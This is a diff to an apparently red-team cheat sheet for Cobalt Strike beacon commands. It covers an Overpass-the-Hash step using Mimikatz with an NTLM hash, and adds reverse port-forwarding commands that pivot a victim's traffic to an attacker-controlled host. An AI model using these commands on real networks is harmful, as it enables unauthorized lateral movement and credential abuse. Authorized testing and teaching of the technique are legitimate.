@@ -29,7 +29,7 @@ beacon> link <IP>
 
 ## Overpass-the-Hash
 
-More opsec PtH than builtin `pth` command:
+More opsec PtH than builtin `pth` command (which does the Mimikatz `sekurlsa::pth` thing with named pipe impersonation):
 
 ```
 beacon> mimikatz sekurlsa::pth /user:snovvcrash /domain:megacorp.local /ntlm:fc525c9683e8fe067095ba2ddc971889
@@ -77,6 +77,18 @@ beacon> beacon> steal_token 1337
 
 
 ## Pivoting
+
+Make any traffic hitting port **8443** on Victim to be redirected to **10.10.13.37** on port **443** (traffic flows through the Team Server):
+
+```
+beacon> rportfwd 8443 10.10.13.37 443
+```
+
+Make any traffic hitting port **8080** on Victim to be redirected to **localhost:8080** on Attacker (traffic flows through the CS client):
+
+```
+beacon> rportfwd_local 8080 127.0.0.1 80
+```
 
 
 
